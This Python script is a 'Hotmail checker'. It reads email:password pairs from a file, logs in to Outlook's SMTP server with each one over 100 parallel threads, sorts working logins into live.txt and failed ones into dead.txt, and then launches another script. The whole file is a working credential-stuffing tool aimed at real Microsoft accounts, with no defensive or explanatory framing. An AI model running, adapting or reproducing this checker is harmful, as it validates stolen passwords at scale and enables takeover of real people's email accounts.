import smtplib
import traceback
import concurrent.futures
from colorama import Fore
import os
import subprocess
import fade

# Define the base directory and file paths
base_dir = os.path.dirname(os.path.abspath(__file__))
live_file_path = os.path.join(base_dir, 'live.txt')
dead_file_path = os.path.join(base_dir, 'dead.txt')
emails_file_path = os.path.join(base_dir, 'emails.txt')

def ensure_directory_exists(directory):
    """Create the directory if it doesn't exist."""
    if not os.path.exists(directory):
        os.makedirs(directory)

def clear_file(file_path):
    """Clear the contents of a file."""
    with open(file_path, 'w') as file:
        file.write('')

def clear_console():
    """Clear the console screen."""
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def banner():
    clear_console()
    text = """
 ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗          
██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝          
██║     ███████║█████╗  ██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗         
██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║         
╚██████╗██║  ██║███████╗╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝██╗██╗██╗
 ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝╚═╝"""
    print(fade.greenblue(text))
    print(fade.greenblue("DATA IS STORED AT MODULES/MODULE_HOTMAILCHECKER/LIVE.TXT & DEAD.TXT"))

def check(subject, body, to_email, sender_email, sender_password):
    try:
        message = f"Subject: {subject}\n\n{body}"
        smtp_server = "smtp-mail.outlook.com"
        smtp_port = 587
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        server.quit()

        return None
    except smtplib.SMTPAuthenticationError:
        return "Authentication failed."
    except Exception as e:
        error_message = f"{str(e)}\n{traceback.format_exc()}"
        return error_message
    
def check_emailpass(emailpass):
    global live
    global dead
    e = str(emailpass).strip().split(':')
    c = check('Checking...', 'Checking...', e[0], e[0], e[1])
    if c is None:
        with open(live_file_path, 'a') as file:
            file.write(emailpass)
        print(Fore.CYAN, emailpass, Fore.WHITE, '->', Fore.LIGHTGREEN_EX, 'Login Success', Fore.WHITE)
    else:
        with open(dead_file_path, 'a') as file:
            file.write(emailpass)
        print(Fore.CYAN, emailpass, Fore.WHITE, '->', Fore.LIGHTRED_EX, c, Fore.WHITE)
    return

def run_hotmail_selector():
    base_dir2 = os.path.dirname(__file__)
    script_path = os.path.join(base_dir, '..', '..', 'init', 'hotmail_selector.py')
    subprocess.run(['python', script_path])

# Clear the contents of live.txt and dead.txt
clear_file(live_file_path)
clear_file(dead_file_path)

banner()
with open(emails_file_path, 'r') as file:
    emails = file.readlines()
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        results = list(executor.map(check_emailpass, emails))

# Call the function to run hotmail_selector.py after the checks are complete
run_hotmail_selector()
